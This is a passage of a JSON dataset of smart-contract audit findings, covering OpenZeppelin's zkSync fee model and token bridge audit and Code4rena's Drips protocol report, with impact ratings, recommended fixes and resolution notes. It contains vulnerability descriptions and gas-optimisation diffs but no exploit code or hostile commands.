      "content": "The `L1ERC20Bridge` and `L2ERC20Bridge` contracts manage the ERC-20 token bridge for the Layer 1 and Layer 2 sides respectively. These two bridge contracts are intertwined, as L1 tokens are locked into the `L1ERC20Bridge` in order to mint the corresponding L2 tokens. Currently, these L1 tokens can only be unlocked in the event of a withdrawal that is initialized through `L2ERC20Bridge`. In the event of an undiscovered bug in the L2 bridge, the only way to upgrade it would be to redeploy a new L1 bridge (since it is not upgradeable).\n\n\nThe new `L1ERC20Bridge` contract would then be intertwined with a new `L2ERC20Bridge`. One drawback of this approach is the inconvenience of re-deploying a new L1 contract every time there is a desire to change the L2 contract. In addition, each ERC-20 token minted on a different L2 bridge would generate a new L2 address, creating multiple copies of the same L1 token in L2. Consider making the `L2ERC20Bridge` upgradable by making it an implementation contract behind a proxy. However, note that even without this upgradeability of the L2 bridge, the upgradeability of the L1 bridge would still prevent L1 tokens from being locked forever.\n\n\n***Update:** Resolved at commit [b51d4c3](https://github.com/matter-labs/zksync-2-contracts/commit/b51d4c30b05b8cd91356280c1e7a33e6150fd430).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync Fee Model and Token Bridge Audit",
      "source_link": "https://blog.openzeppelin.com/zksync-fee-model-and-token-bridge-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10326",
      "title": "Missing Error Messages in require and revert Statements",
      "impact": "LOW",
      "content": "Throughout the [bridge](https://github.com/matter-labs/zksync-2-contracts/tree/9f3c6944e6320166edd96ef6586a9dd4548a27f2) and [system contracts codebases](https://github.com/matter-labs/system-contracts/tree/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f) there are `require` and `revert` statements that lack error messages:\n\n\n* The `require` statement on [line 96](https://github.com/matter-labs/zksync-2-contracts/blob/9f3c6944e6320166edd96ef6586a9dd4548a27f2/zksync/contracts/bridge/L2StandardERC20.sol#L96) of [`L2StandardERC20.sol`](https://github.com/matter-labs/zksync-2-contracts/blob/9f3c6944e6320166edd96ef6586a9dd4548a27f2/zksync/contracts/bridge/L2StandardERC20.sol)\n* The `revert` statement on [line 116](https://github.com/matter-labs/zksync-2-contracts/blob/9f3c6944e6320166edd96ef6586a9dd4548a27f2/zksync/contracts/bridge/L2StandardERC20.sol#L116) of [`L2StandardERC20.sol`](https://github.com/matter-labs/zksync-2-contracts/blob/9f3c6944e6320166edd96ef6586a9dd4548a27f2/zksync/contracts/bridge/L2StandardERC20.sol)\n* The `revert` statement on [line 122](https://github.com/matter-labs/zksync-2-contracts/blob/9f3c6944e6320166edd96ef6586a9dd4548a27f2/zksync/contracts/bridge/L2StandardERC20.sol#L122) of [`L2StandardERC20.sol`](https://github.com/matter-labs/zksync-2-contracts/blob/9f3c6944e6320166edd96ef6586a9dd4548a27f2/zksync/contracts/bridge/L2StandardERC20.sol)\n* The `revert` statement on [line 128](https://github.com/matter-labs/zksync-2-contracts/blob/9f3c6944e6320166edd96ef6586a9dd4548a27f2/zksync/contracts/bridge/L2StandardERC20.sol#L128) of [`L2StandardERC20.sol`](https://github.com/matter-labs/zksync-2-contracts/blob/9f3c6944e6320166edd96ef6586a9dd4548a27f2/zksync/contracts/bridge/L2StandardERC20.sol)\n* The `require` statement on [line 25](https://github.com/matter-labs/system-contracts/blob/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f/contracts/AccountCodeStorage.sol#L25) of [`AccountCodeStorage.sol`](https://github.com/matter-labs/system-contracts/blob/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f/contracts/AccountCodeStorage.sol)\n* The `require` statement on [line 36](https://github.com/matter-labs/system-contracts/blob/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f/contracts/AccountCodeStorage.sol#L36) of [`AccountCodeStorage.sol`](https://github.com/matter-labs/system-contracts/blob/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f/contracts/AccountCodeStorage.sol)\n* The `require` statement on [line 50](https://github.com/matter-labs/system-contracts/blob/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f/contracts/AccountCodeStorage.sol#L50) of [`AccountCodeStorage.sol`](https://github.com/matter-labs/system-contracts/blob/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f/contracts/AccountCodeStorage.sol)\n* The `require` statement on [line 39](https://github.com/matter-labs/system-contracts/blob/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f/contracts/ContractDeployer.sol#L39) of [`ContractDeployer.sol`](https://github.com/matter-labs/system-contracts/blob/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f/contracts/ContractDeployer.sol)\n* The `require` statement on [line 34](https://github.com/matter-labs/system-contracts/blob/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f/contracts/ImmutableSimulator.sol#L34) of [`ImmutableSimulator.sol`](https://github.com/matter-labs/system-contracts/blob/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f/contracts/ImmutableSimulator.sol)\n\n\nConsider including specific, informative error messages in `require` and `revert` statements to improve overall code clarity and facilitate troubleshooting whenever a requirement is not satisfied. In addition, for statements that do contain a message, consider using longer strings instead of a few characters to describe the error.\n\n\n***Update:** Resolved in [pull request #212](https://github.com/matter-labs/system-contracts/pull/212) at commit [cb93637](https://github.com/matter-labs/system-contracts/pull/212/commits/cb936372ba8e97e8e17e9f231ab8630d45c223e1) and [pull request #63](https://github.com/matter-labs/zksync-2-contracts/pull/63) at commit [77e64b5](https://github.com/matter-labs/zksync-2-contracts/pull/63/commits/77e64b59b00cc34c4af424b81c6c8889a686d171). The Matter Labs team stated:*\n\n\n\n> *We did not add error messages to reverts from name/symbol/decimals functions because if the token does not implement that method it should behave exactly the same way as if the function was not declared.*\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync Fee Model and Token Bridge Audit",
      "source_link": "https://blog.openzeppelin.com/zksync-fee-model-and-token-bridge-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10325",
      "title": "Missing Factory Dependencies",
      "impact": "MEDIUM",
      "content": "When the `L1ERC20Bridge` is initialized, the bytecode of the L2 bridge and token proxy [are both provided](https://github.com/matter-labs/zksync-2-contracts/blob/9f3c6944e6320166edd96ef6586a9dd4548a27f2/ethereum/contracts/bridge/L1ERC20Bridge.sol#L72) as factory dependencies. This ensures the code [is known](https://github.com/matter-labs/system-contracts/blob/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f/contracts/KnownCodesStorage.sol#L96) when the L2 Bridge is deployed, or a new token is created. However, the L2 bridge initialization also [deploys the token implementation and proxy beacon](https://github.com/matter-labs/zksync-2-contracts/blob/9f3c6944e6320166edd96ef6586a9dd4548a27f2/zksync/contracts/bridge/L2ERC20Bridge.sol#L43-L44). Since neither contract was listed as a factory dependency, they may not be marked as known. Unless they were previously mentioned in an unrelated transaction, the bridge initialization will fail.\n\n\nConsider including the `L2StandardERC20` and the `UpgradeableBeacon` contracts in the factory dependencies of the bridge initialization transaction.\n\n\n***Update:** Acknowledged, will resolve. The Matter Labs team stated:*\n\n\n\n> *Acknowledged. The problem can only be encountered at the initialization stage, so we prefer not to change the deployment scripts at the moment. This has been included in the backlog as a refactoring task.*\n> \n>",
      "summary": "\nThe bug report concerns the `L1ERC20Bridge` initialization process. During the initialization, both the bytecode of the L2 bridge and token proxy are provided as factory dependencies. This ensures that the code is known when the L2 Bridge is deployed, or a new token is created. However, the L2 bridge initialization also deploys the token implementation and proxy beacon, but neither contract was listed as a factory dependency. This means that they may not be marked as known, and the bridge initialization will fail.\n\nThe suggested solution is to include the `L2StandardERC20` and the `UpgradeableBeacon` contracts in the factory dependencies of the bridge initialization transaction. The Matter Labs team has acknowledged the issue, but prefer not to change the deployment scripts at the moment and have included it in the backlog as a refactoring task.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync Fee Model and Token Bridge Audit",
      "source_link": "https://blog.openzeppelin.com/zksync-fee-model-and-token-bridge-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10324",
      "title": "Overflows in Fee Computation",
      "impact": "MEDIUM",
      "content": "The bootloader changes in scope involve a few formulas as part of the fee model, and there were a few instances where calculations were performed on user or operator-provided inputs. Unchecked arithmetic (without overflow protection) using these values is generally dangerous and prone to exploits.\n\n\nOne example is the calculated ergs price. If the `maxPriorityFeePerErg` is sufficiently large and the `maxFeePerErg` value is [increased to match](https://github.com/matter-labs/system-contracts/blob/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f/bootloader/bootloader.yul#L930), the [`maxFeeThatOperatorCouldTake`](https://github.com/matter-labs/system-contracts/blob/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f/bootloader/bootloader.yul#L944) calculation could overflow, resulting in a zero ergs price. The transaction will still be executed but the [amount the user pays](https://github.com/matter-labs/system-contracts/blob/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f/bootloader/bootloader.yul#L642) would be zero. A savvy operator could recognize this scenario and discard the operation, but it does make the system unnecessarily fragile.\n\n\nWe also identified the following cases where potential overflows with user-provided values appear to be unmitigated, although the consequences are limited:\n\n\n* The [`intrinsicOverhead`](https://github.com/matter-labs/system-contracts/blob/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f/bootloader/bootloader.yul#L1024) calculation in the `getErgsLimitForTx` function\n* The [return value](https://github.com/matter-labs/system-contracts/blob/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f/bootloader/bootloader.yul#L1457) of the `getBlockOverheadErgs` function\n* The numerators of the `overheadForCircuits`, `overheadForLength`, and `overheadForPubdata` calculations in the [`getTransactionUpfrontOverhead`](https://github.com/matter-labs/system-contracts/blob/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f/bootloader/bootloader.yul#L1478) function\n\n\nLastly, the following functions appear to allow overflows, but they are protected by validations in other parts of the codebase:\n\n\n* In [`getBaseFee`](https://github.com/matter-labs/system-contracts/blob/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f/bootloader/bootloader.yul#L90), a large `l1GasPrice` could cause `pubdataBytePriceETH` to overflow but the [`validateOperatorProvidedPrices` checks](https://github.com/matter-labs/system-contracts/blob/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f/bootloader/bootloader.yul#L34) prevent this.\n* In [`processL1Tx`](https://github.com/matter-labs/system-contracts/blob/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f/bootloader/bootloader.yul#L813), `toRefundRecipient` would negative overflow if the value was too large, but the check on [line 1306](https://github.com/matter-labs/system-contracts/blob/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f/bootloader/bootloader.yul#L1306) prevents this.\n* In [`getErgsLimitForTx`](https://github.com/matter-labs/system-contracts/blob/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f/bootloader/bootloader.yul#L1003), `ergsLimitForTx` would negative overflow if the `operatorOverheadForTransaction` was too large, but the check on [line 1253](https://github.com/matter-labs/system-contracts/blob/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f/bootloader/bootloader.yul#L1253) prevents this.\n\n\nConsider applying additional checks to these operations, explicitly documenting where the checks are or why they would not be necessary. Whenever a potential overflow is not mitigated in the same function, consider documenting where the relevant validation can be found. It is advised to check the rest of the bootloader for more potential overflows and underflows. Lastly, it is recommended to validate all changes with proper dynamic testing.\n\n\n***Update:** Resolved in [pull request #211](https://github.com/matter-labs/system-contracts/pull/211) at commit [448932e](https://github.com/matter-labs/system-contracts/pull/211/commits/448932ec7d8797961919d74bbfbc1b074bec4efd).*",
      "summary": "\nThis bug report is about the bootloader changes in scope that involve a few formulas as part of the fee model. It was discovered that unchecked arithmetic (without overflow protection) was being used with user or operator-provided inputs, which can be dangerous and prone to exploits. An example of this is the calculated ergs price, which could result in a zero ergs price if the maxPriorityFeePerErg is sufficiently large and the maxFeePerErg value is increased to match.\n\nIt was also identified that there are potential overflows with user-provided values that appear to be unmitigated, although the consequences are limited. These include the intrinsicOverhead calculation in the getErgsLimitForTx function, the return value of the getBlockOverheadErgs function, and the numerators of the overheadForCircuits, overheadForLength, and overheadForPubdata calculations in the getTransactionUpfrontOverhead function.\n\nLastly, there are functions that appear to allow overflows, but they are protected by validations in other parts of the codebase. These include the getBaseFee, processL1Tx, and getErgsLimitForTx functions. It is advised to check the rest of the bootloader for more potential overflows and underflows, and to validate all changes with proper dynamic testing. The bug has since been resolved in pull request #211 at commit 448932e.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync Fee Model and Token Bridge Audit",
      "source_link": "https://blog.openzeppelin.com/zksync-fee-model-and-token-bridge-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10323",
      "title": "ceilDiv Function Can Overflow",
      "impact": "MEDIUM",
      "content": "The [`ceilDiv` function](https://github.com/matter-labs/system-contracts/blob/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f/bootloader/bootloader.yul#L548) of the bootloader is used throughout the fee model formulas. This function can overflow as the numerator and denominator are added together before they are divided. Although this was not identified as a threat in the current codebase, an issue could be introduced by using this function with unvalidated inputs.\n\n\nConsider adapting the formula to be safe from overflows.\n\n\n***Update:** Resolved in [pull request #236](https://github.com/matter-labs/system-contracts/pull/236) at commit [56b3231](https://github.com/matter-labs/system-contracts/pull/236/commits/56b323195d4dd1f23c434d60d66b84e4e1b4ec98).*",
      "summary": "\nThe `ceilDiv` function of the bootloader is used throughout the fee model formulas. This function can cause an overflow when the numerator and denominator are added together before they are divided. Although this was not identified as a threat in the current codebase, an issue could be introduced by using this function with unvalidated inputs. To prevent this from happening, the formula should be adapted to be safe from overflows. This issue has since been resolved in pull request #236 at commit 56b3231.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync Fee Model and Token Bridge Audit",
      "source_link": "https://blog.openzeppelin.com/zksync-fee-model-and-token-bridge-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10322",
      "title": "Lack of __gap Variable",
      "impact": "MEDIUM",
      "content": "The [`L1ERC20Bridge`](https://github.com/matter-labs/zksync-2-contracts/blob/9f3c6944e6320166edd96ef6586a9dd4548a27f2/ethereum/contracts/bridge/L1ERC20Bridge.sol) and [`L2StandardERC20`](https://github.com/matter-labs/zksync-2-contracts/blob/9f3c6944e6320166edd96ef6586a9dd4548a27f2/zksync/contracts/bridge/L2StandardERC20.sol) contract are intended to be used as logic contracts with a proxy, but do not have a `__gap` variable. This would become problematic if a subsequent version was to inherit one of these contracts. If the derived version were to have storage variables itself and additional storage variables were subsequently added to the inherited contract, a storage collision would occur.\n\n\nConsider appending a [`__gap` variable](https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps) as the last storage variable to these upgradeable contracts, such that the storage slots sum up to a fixed amount (e.g. 50). This will proof any future storage layout changes to the base contract. Note that the `__gap` variable space will need to be adjusted accordingly as subsequent versions include more storage variables, in order to maintain the fixed amount of slots (e.g. 50).\n\n\n***Update:** Acknowledged, not resolved. The Matter Labs team stated:*\n\n\n\n> *While we appreciate your insights and suggestions, we do not believe the issue has a significant security risk. Specified contracts are not expected to be inherited, since they are complete logical contracts.*\n> \n>",
      "summary": "\nThis bug report is about the [`L1ERC20Bridge`](https://github.com/matter-labs/zksync-2-contracts/blob/9f3c6944e6320166edd96ef6586a9dd4548a27f2/ethereum/contracts/bridge/L1ERC20Bridge.sol) and [`L2StandardERC20`](https://github.com/matter-labs/zksync-2-contracts/blob/9f3c6944e6320166edd96ef6586a9dd4548a27f2/zksync/contracts/bridge/L2StandardERC20.sol) contracts, which are intended to be used as logic contracts with a proxy. The bug is that these contracts do not have a `__gap` variable. This could cause a storage collision if a subsequent version of the contract were to inherit one of these contracts and add storage variables, as the storage slots would not sum up to a fixed amount.\n\nThe suggestion is to add a `__gap` variable to these contracts, such that the storage slots sum up to a fixed amount. This would help protect against storage layout changes in the base contract. However, the Matter Labs team has acknowledged the issue but stated that they do not believe the issue has a significant security risk, as the specified contracts are not expected to be inherited.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync Fee Model and Token Bridge Audit",
      "source_link": "https://blog.openzeppelin.com/zksync-fee-model-and-token-bridge-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10321",
      "title": "Users Can Lose Funds in L1ERC20Bridge Implementation Contract",
      "impact": "MEDIUM",
      "content": "The `L1ERC20Bridge` is the implementation contract that is intended to be used with a proxy, so it is good practice to restrict how it can be invoked directly. When the contract is constructed, the `reentrancyGuardInitializer` modifier is executed and the immutable [`_mailbox` address is written](https://github.com/matter-labs/zksync-2-contracts/blob/9f3c6944e6320166edd96ef6586a9dd4548a27f2/ethereum/contracts/bridge/L1ERC20Bridge.sol#L58) to the bytecode that is deployed. During this invocation of `reentrancyGuardInitializer`, the reentrancy status is set to `_NOT_ENTERED`, which locks the `initialize` function from being called, but simultaneously allows functions with the `nonReentrant` modifier to be called.\n\n\nSpecifically, the `deposit` function of the implementation contract is callable. However, in the implementation contract itself, many variables are not initialized, such as the [`l2Bridge` variable](https://github.com/matter-labs/zksync-2-contracts/blob/9f3c6944e6320166edd96ef6586a9dd4548a27f2/ethereum/contracts/bridge/L1ERC20Bridge.sol#L126), so it holds the zero-address. Therefore, the `deposit` function would request an L2 transaction that attempts to finalize the withdrawal by calling the zero-address, thereby triggering the non-reverting fallback function of the [`EmptyContract`](https://github.com/matter-labs/system-contracts/blob/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f/contracts/EmptyContract.sol). Since this L2 call does not fail, the deposited tokens are locked and irrecoverable, as a call to [`claimFailedDeposit`](https://github.com/matter-labs/zksync-2-contracts/blob/9f3c6944e6320166edd96ef6586a9dd4548a27f2/ethereum/contracts/bridge/L1ERC20Bridge.sol#L185) cannot be proven.\n\n\nConsider implementing a stricter mechanism that prohibits direct calls to the contract if all or some of its variables were not properly initialized. In addition, consider preventing the initialization of the implementation contract more directly, rather than relying on the implicit behavior of `reentrancyGuardInitializer`, which lacks visibility.\n\n\n***Update:** Acknowledged, not resolved. The Matter Labs team stated:*\n\n\n\n> *While we appreciate your insights and suggestions, we do not believe the issue carries a significant security risk. As the contract is intended to be used through a proxy, direct calls to the implementation contract are not recommended. Users could also call any other scam contract.*\n> \n>",
      "summary": "\nThis bug report is about the `L1ERC20Bridge` implementation contract. When the contract is constructed, a modifier called `reentrancyGuardInitializer` is executed and an immutable address is written to the bytecode that is deployed. This allows functions with the `nonReentrant` modifier to be called, such as the `deposit` function. However, many variables of the contract are not initialized, such as the `l2Bridge` variable, which holds the zero-address. This means that the `deposit` function would request an L2 transaction that attempts to finalize the withdrawal by calling the zero-address, triggering the non-reverting fallback function of the `EmptyContract`. This would result in the deposited tokens being locked and irrecoverable.\n\nThe bug report suggests implementing a stricter mechanism that prohibits direct calls to the contract if all or some of its variables were not properly initialized. Additionally, it suggests preventing the initialization of the implementation contract more directly, rather than relying on the implicit behavior of `reentrancyGuardInitializer`. The Matter Labs team acknowledged the issue, but did not believe it carried a significant security risk as the contract is intended to be used through a proxy.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync Fee Model and Token Bridge Audit",
      "source_link": "https://blog.openzeppelin.com/zksync-fee-model-and-token-bridge-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10320",
      "title": "Malicious Operator Can Dodge Refund",
      "impact": "HIGH",
      "content": "In the [`refundCurrentL2Transaction` function](https://github.com/matter-labs/system-contracts/blob/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f/bootloader/bootloader.yul#L1154), the user gets refunded for overpaying in ergs for their L2 transaction. The ETH amount to refund is dependent on the ergs amount and the ergs price. The ergs amount is the maximum value of the operator-provided value and the one calculated by the bootloader. The ergs amount multiplied by the ergs price determines the refund in ETH.\n\n\nA malicious operator can provide a very large amount of ergs that should be refunded, which will therefore be the chosen [`refundInErgs` value](https://github.com/matter-labs/system-contracts/blob/191246a878f1493a5ed5f0fa6d79af4ce3e7eb8f/bootloader/bootloader.yul#L1204). However, when multiplied by the ergs price, `ethToRefund` can overflow and lead to a very low refund, effectively stealing funds from the user.\n\n\nConsider calculating the refund based on the bootloader and operator values individually and then picking the higher amount to protect the fee model against a malicious operator.\n\n\n***Update:** Resolved in [pull request #208](https://github.com/matter-labs/system-contracts/pull/208) at commit [57ba2b1](https://github.com/matter-labs/system-contracts/pull/208/commits/57ba2b120026ab6373505f362eebe6f640adb8b6).*",
      "summary": "\nA bug was discovered in the `refundCurrentL2Transaction` function in the Matter Labs system contracts. This bug could have allowed a malicious operator to provide a very large amount of ergs that should be refunded, which would then be multiplied by the ergs price to determine the refund in ETH. This could have caused an overflow and lead to a very low refund, effectively stealing funds from the user. \n\nThe bug was resolved in pull request #208 at commit 57ba2b1. The solution was to calculate the refund based on the bootloader and operator values individually and then picking the higher amount to protect the fee model against a malicious operator.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync Fee Model and Token Bridge Audit",
      "source_link": "https://blog.openzeppelin.com/zksync-fee-model-and-token-bridge-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "22776",
      "title": "[G-06] Transfer erc20 immediately to Dripshub",
      "impact": "GAS",
      "content": "- `Dripshub: give()` gas saved: 9449\n- `AddressDriver: give()` gas saved: 29439\n- `NFTDriver: give()` gas saved: 18936\n\nWhen you call the `give()` function in the Address or NFTDriver. The erc20 token are first getting send to those contracts and afterwards to the DripsHub contract. It's also possible to send the tokens directly to the dripsHub contract.\n\n[AddressDriver.sol#L170-L176](https://github.com/code-423n4/2023-01-drips/blob/main/src/AddressDriver.sol#L170-L176) [NFTDriver.sol#L285-L291](https://github.com/code-423n4/2023-01-drips/blob/main/src/NFTDriver.sol#L285-L291)\n```diff\n    function _transferFromCaller(IERC20 erc20, uint128 amt) internal {\n-       erc20.safeTransferFrom(_msgSender(), address(this), amt);\n+       erc20.safeTransferFrom(_msgSender(), address(dripsHub), amt);\n        // Approval is done only on the first usage of the ERC-20 token in DripsHub by the driver\n-       if (erc20.allowance(address(this), address(dripsHub)) == 0) {\n-           erc20.safeApprove(address(dripsHub), type(uint256).max);\n        }\n    }\n```\n\n[DripsHub.sol#L417](https://github.com/code-423n4/2023-01-drips/blob/main/src/DripsHub.sol#L417)\n```diff\n    function give(uint256 userId, uint256 receiver, IERC20 erc20, uint128 amt)\n        public\n        whenNotPaused\n        onlyDriver(userId)\n    {\n        _increaseTotalBalance(erc20, amt);\n        Splits._give(userId, receiver, _assetId(erc20), amt);\n-       erc20.safeTransferFrom(msg.sender, address(this), amt);\n    }\n```\nsetDrips need to be adjusted or you can create a seperate function for that.\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22774",
      "title": "[N-01] The NatSpec comment of the `DripsConfigImpl.lt` function neglects to sorting of `dripId`",
      "impact": "LOW",
      "content": "\nAccording to the NatSpec comment of the `DripsConfigImpl.lt` function, the `DripsConfig` struct is sorted by `amtPerSec`, then `start` and then `duration`. However, the `dripId` is not mentioned in the comment:\n\n> /// First compares their `amtPerSec`s, then their `start`s and then their `duration`s.\n\n### Findings\n\n[Drips.sol#L93](https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/Drips.sol#L93)\n\n```solidity\n92: /// @notice Compares two `DripsConfig`s.\n93: /// First compares their `amtPerSec`s, then their `start`s and then their `duration`s.\n94: function lt(DripsConfig config, DripsConfig otherConfig) internal pure returns (bool) {\n95:     return DripsConfig.unwrap(config) < DripsConfig.unwrap(otherConfig);\n96: }\n```\n\n[Drips.sol#L1069](https://github.com/code-423n4/2023-01-drips/blob/9fd776b50f4be23ca038b1d0426e63a69c7a511d/src/Drips.sol#L1069)\n\n```solidity\n1061: function _isOrdered(DripsReceiver memory prev, DripsReceiver memory next)\n1062:     private\n1063:     pure\n1064:     returns (bool)\n1065: {\n1066:     if (prev.userId != next.userId) {\n1067:         return prev.userId < next.userId;\n1068:     }\n1069:     return prev.config.lt(next.config); // @audit-info `dripId` of receiver config (The 32 most significant bits) is considered while sorting receivers\n1070: }\n```\n\n### Recommended Mitigation Steps\n\nConsider updating the NatSpec comment to include the `dripId` in the sorting order.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-01-drips-findings/issues/282#issuecomment-1430315911):**\n>*(Note: See [original submission](https://github.com/code-423n4/2023-01-drips-findings/issues/282#issuecomment-1430315911) for judge's full commentary.)*\n> \n> 9 Low, 1 Refactoring +3\n>\n> (includes  downgraded findings, see: [#274](https://github.com/code-423n4/2023-01-drips-findings/issues/274), [#278](https://github.com/code-423n4/2023-01-drips-findings/issues/278), [#280](https://github.com/code-423n4/2023-01-drips-findings/issues/280), [#281](https://github.com/code-423n4/2023-01-drips-findings/issues/281))\n>\n>\n> Summing up all findings, this report is by far the most interesting, well done!\n>\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "6590",
      "title": "[G-09] Miscellaneous",
      "impact": "GAS",
      "content": "\n### Don't call a function when initializing an immutable variable\nSaves a little bit of deployment gas\n```diff\n-   bytes32 private immutable _counterSlot = _erc1967Slot(\"eip1967.immutableSplitsDriver.storage\");\n+   bytes32 private immutable _counterSlot = bytes32(uint256(keccak256(bytes(\"eip1967.immutableSplitsDriver.storage\"))) - 1);\n```\n### Use a mapping type of a struct directly instead of assigning it to another storage variable\n- [Drips.sol#L246-L254](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L246-L254)\n```diff\n-   mapping(uint32 => AmtDelta) storage amtDeltas = state.amtDeltas;\n    for (uint32 cycle = fromCycle; cycle < toCycle; cycle++) {\n-       delete amtDeltas[cycle];\n+       delete state.amtDeltas[cycle];\n    }\n    // The next cycle delta must be relative to the last received cycle, which got zeroed.\n    // In other words the next cycle delta must be an absolute value.\n    if (finalAmtPerCycle != 0) {\n-       amtDeltas[toCycle].thisCycle += finalAmtPerCycle;\n+       state.amtDeltas[toCycle].thisCycle += finalAmtPerCycle;\n    }\n```\n### If statement can be adjusted\nIn the `_receiveDrips()` function you can change the check to `receivedAmt != 0`. Because when fromCycle and toCycle are the same. ReceivedAmt will be 0.\n\n[Drips.sol#L243](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L243) `receiveDrips()` gas saved: 75\n```diff\n        (receivedAmt, receivableCycles, fromCycle, toCycle, finalAmtPerCycle) =\n            _receiveDripsResult(userId, assetId, maxCycles);\n-       if (fromCycle != toCycle) {\n+       if (receivedAmt != 0) {\n```\n\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-01-drips-findings/issues/81#issuecomment-1431565422):**\n> Best because the savings are high impact and tangible.\n>\n> [G-01]\tMake for loop unchecked\t644\t13\n>\n> Let's say 260 gas (13 * 20)\n> \n> [G-02]\tUse an unchecked block when operands can't underflow/overflow\t688\t7\n>\n> 20 * 7 = 140\n> \n> [G-03]\tWrite element of storage struct to memory when used more than once\t10\t1\n>\n> 100 gas\n> \n> [G-04]\tCall block.timestamp direclty instead of function\t22\t1\n>\n> 16\n> \n> [G-06]\tTransfer erc20 immediately to Dripshub\t57824\t1\n>\n> 5k\n> \n> [G-07]\tTransfer ERC20 immediately to the user\t22112\t1\n>\n> 5k\n> \n> Rest is marginal\n> \n> 10k+\n>\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "#g-09-miscellaneous",
      "tags": [],
      "finders": []
    },
    {
      "id": "6589",
      "title": "[G-08] Use double if statements instead of &&",
      "impact": "GAS",
      "content": "\nIf the if statement has a logical AND and is not followed by an else statement, it can be replaced with 2 if statements.\n\n- [Drips.sol#L700](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L700)\n- [Drips.sol#L709](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L709)\n- [Drips.sol#L909](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L909)\n- [Drips.sol#L929](https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L929)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "#g-08-use-double-if-statements-instead-of-",
      "tags": [],
      "finders": []
    },
    {
      "id": "6588",
      "title": "[G-07] Transfer ERC20 immediately to the user",
      "impact": "GAS",
